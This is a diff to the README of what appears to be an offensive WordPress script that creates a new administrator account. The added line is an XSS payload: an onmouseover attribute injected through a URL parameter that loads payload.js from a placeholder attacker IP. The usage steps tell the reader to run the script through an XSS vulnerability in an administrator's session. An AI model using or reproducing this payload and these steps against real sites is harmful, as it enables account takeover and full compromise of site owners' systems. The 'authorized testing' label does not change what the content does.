@@ -24,5 +24,6 @@ This script is intended for **authorized penetration testing and educational pur
 ## 🧑‍💻 Usage
 
 1. Copy and paste the script into a browser console or inject it via an **XSS vulnerability**.
-2. Ensure you are **authenticated as an administrator** in the target WordPress site.
-3. The script will create a new administrator user with the provided credentials.
+For example: ``http://target.com/?page=" onmouseover="var script = document.createElement('script'); script.src = 'http://XX.XX.XX.XX/payload.js'; document.head.appendChild(script);``
+3. Ensure you are **authenticated as an administrator** in the target WordPress site.
+4. The script will create a new administrator user with the provided credentials.
